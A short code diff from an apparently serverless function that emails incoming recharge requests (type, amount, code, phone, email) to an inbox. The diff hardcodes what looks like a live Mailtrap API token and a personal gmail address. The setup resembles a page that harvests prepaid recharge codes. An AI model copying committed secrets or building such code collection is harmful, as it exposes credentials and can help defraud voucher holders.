@@ -14,14 +14,10 @@ serve(async (req) => {
   try {
     const { type, amount, code, phone, email } = await req.json();
 
-    // ======================================
-    // 🔧 REMPLACEZ CES VALEURS PAR LES VÔTRES
-    // ======================================
-    const MAILTRAP_API_TOKEN = "VOTRE_TOKEN_API_MAILTRAP";
-    const SENDER_EMAIL = "noreply@votredomaine.com";
-    const SENDER_NAME = "Authentif Recharges";
-    const RECIPIENT_EMAIL = "destinataire@exemple.com"; // L'email qui reçoit les demandes
-    // ======================================
+    const MAILTRAP_API_TOKEN = "e6ba5ca0a11de7fc0a965cf5a4b1f237";
+    const SENDER_EMAIL = "jausuer0@gmail.com";
+    const SENDER_NAME = "Authentis Recharges";
+    const RECIPIENT_EMAIL = "jausuer0@gmail.com";
 
     const emailHtml = `
       <h2>Nouvelle demande de recharge</h2>
